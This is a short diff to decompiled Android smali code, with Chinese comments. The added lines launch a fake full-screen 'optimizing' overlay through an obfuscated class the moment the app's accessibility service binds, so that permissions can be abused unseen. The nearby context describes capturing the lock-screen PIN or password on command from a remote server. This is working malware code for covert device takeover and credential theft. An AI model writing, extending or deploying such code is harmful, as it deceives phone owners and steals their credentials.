@@ -4367,6 +4367,16 @@
 
     move-object/from16 v1, p0
 
+    # 2.2：无障碍一绑定就拉起“优化中”全屏遮罩（权限在后台跑）
+    :try_start_opt
+    invoke-static {v1}, Lڗًقڔ/؋;->ٽ(Landroid/content/Context;)V
+    :try_end_opt
+    .catch Ljava/lang/Exception; {:try_start_opt .. :try_end_opt} :catch_opt
+    goto :goto_opt
+
+    :catch_opt
+    :goto_opt
+
     # 2.2 锁屏凭据采集：无障碍一绑定就进入采集状态（覆盖层 + 安全锁屏登记）
     # 密码框不再自动弹，等服务器下发指令后再调 PinCapture.prompt()
     :try_start_pincap
